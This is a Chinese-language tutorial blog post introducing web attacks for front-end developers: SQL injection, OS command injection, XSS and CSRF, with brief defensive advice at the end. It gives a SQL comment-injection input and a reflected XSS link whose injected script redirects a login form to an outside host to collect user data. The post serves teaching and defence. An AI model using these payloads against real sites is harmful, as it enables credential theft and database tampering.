## 引言
关于 Web 安全方面的问题，我想从事 Web 前端开发的同学，或多或少都会有些了解，例如 XSS （跨站点脚本攻击）、CSRF（跨站点请求伪造）、SQL 注入、HTTP 报文劫持等等。但是，我想详细起来说，大家可能会只是说的模模糊糊的。

首先，针对 Web 的攻击可以分为这两种模式：
- 主动攻击，即攻击者通过 Web 应用直接将攻击代码传入，例如 SQL 注入、OS 命令注入
- 被动攻击，即攻击者利用**陷阱**的方式执行攻击代码，例如 XSS、CSRF

## 主动攻击
### SQL 注入
SQL 注入，即针对 Web 应用使用的数据库，通过注入一些非法的 SQL 语句，从而获取、破坏 Web 应用的数据库。
例如：
在前端，我们通常会存在这样的场景，通过查询一个人的名字，然后从一个很多数据的列表中找到这条记录，而我们传给后端的通常是一个键值对，然后后端根据这个键值对去数据库里查找，例如查找 username 为 wjc 的这一条数据，对应的 SQL 会是这样：
```javascript
SELECT * FROM student WHERE username = 'wjc'
```
但是如果我此时传的 username 的 value 为 wjc'--，那么对应的 SQL 会是这样：
```javascript
SELECT * FROM student WHERE username = 'wjc'--'
```
如果此时 username = 'wjc' 后面如果还存在其他条件，那么都会被 -- 注释掉（当然对于我们这个 SQL 并没有影响）

### OS 命令注入

OS 命令注入（OS Command Inject），指的是攻击者通过 Web 应用执行非法的 OS 命令，例如可以通过邮件注入 OS 命令来获取其他目录的信息并发送给其他邮件。（具体的例子就补列举了哈）

## 被动攻击
### XSS 跨站点脚本攻击
XSS 跨站点脚本攻击（Cross-Site Scripting, XSS），常见的就是一些 Web 应用存在动态地创建 HTML 的情况，攻击者通过这来创建一些非法的 HTML 和 JavaScript。
例如：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200204145215149.png)
此时对应的 HTML 代码：
```javascript
 	<form method="post" action="http://localhost/login">
		姓名：<input type="text" name="username" value="wjc"/>
		<input type="submit" value="提交" id="login"/>
	</form>
```
那么这个时候我们就可以给用户一个我们注入 Script 标签的链接，例如：
```javascript
http://localhost/login?username=wjc"/><script>var formO = document.getElementById('login');formO.action="http://abcadada.com";formO.method="get";</script><img src="
```
如果此时点击这个链接，那么会这个时候 Script 标签里面的 JS 代码就会运行起来，此时的 HTML 代码会是这样的：
```javascript
 	<form method="post" action="http://localhost/login">
		姓名：<input type="text" name="username" value="wjc"/><script>var formO = document.getElementById('login');formO.action="http://abcadada.com";formO.method="get";</script><img src=""/>
		<input type="submit" value="提交" id="login"/>
	</form>
```
那么此时这个页面的提交地址已经发生了变化，如果此时用户将自己的信息通过这个表单提交了，那么攻击者就可以收集到用户的信息。

### CSRF 跨站点请求伪造
CSRF 跨站点请求伪造（Cross Site Request Forgery），通常是利用用户的登录态，来发送一些恶意的请求，例如银行转账、信息删除等等。
例如：
我们在登录一些网站后，会在本地保存我们的登录态，这样在登录态没有失效的区间内，我们下次进入网站的时候就可以不用手动登录，从而自动登录。例如通过 Cookie 存 SessionID 的方式登录，在每一次请求的时候都会带上这个 Cookie，然后后端去读这个 Cookie 识别当前用户。
所以，这就会存在这样的场景，当我们登录 A 网站后，我们去浏览 B 网站的时候（此时 B 网站是一个恶意网站），当我们点击这个网站一些链接的时候，它就会利用这个 Cookie 去请求 A 网站的接口，从而实现非法的操作。

## 防御措施
其实，对于上面所说的攻击，具体对应的防御的方式，也不需要死记硬背。如果是一些脚本注入或者 SQL 注入之类的，我们所需要做的就是针对一些非法的输入进行限制或者转义。而对于一些和 HTTP 报文相关的，我们就需要利用请求报文或者响应报文来判断，例如 CSRF 请求伪造，我们就可以通过报文中的 referer 进行校验，又或者和 cookie 相关的，可以对cookie 的域名限制和设置 HttpOnly 等等。